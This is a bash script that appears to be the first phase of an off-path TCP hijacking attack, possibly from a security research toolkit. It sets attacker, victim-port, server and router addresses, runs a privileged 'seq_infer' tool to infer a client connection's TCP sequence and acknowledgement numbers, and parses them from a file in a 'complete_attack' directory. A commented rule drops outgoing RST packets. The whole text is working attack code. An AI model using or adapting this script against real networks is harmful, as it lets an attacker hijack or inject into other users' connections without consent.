# !/bin/bash
ATTACKER_PRIVATE_IP=192.168.31.66; 
GUESSED_CLIENT_PORT=50000;
REMOTE_SERVER_IP=43.159.39.110; 
REMOTE_SERVER_PORT=1000; 
ROUTER_WAN_IP=166.111.237.225; 
PACKET_IFACE="en0"; 

# sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP
printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`
echo "determining if client is talking to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT} on any port.."


sudo ./seq_infer ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS}

SEQ_ACK_RESULT=$(cat ../complete_attack/SEQ_ACK_RESULT)
SEQ=$(echo "$SEQ_ACK_RESULT" |grep -o "seq: .*"| awk -F": " '{print $2}'|head -n 1)
# echo $SEQ
ACK=$(echo "$SEQ_ACK_RESULT" |grep -o "ack: .*"| awk -F": " '{print $2}'|head -n 1)
echo `date`
sleep 3s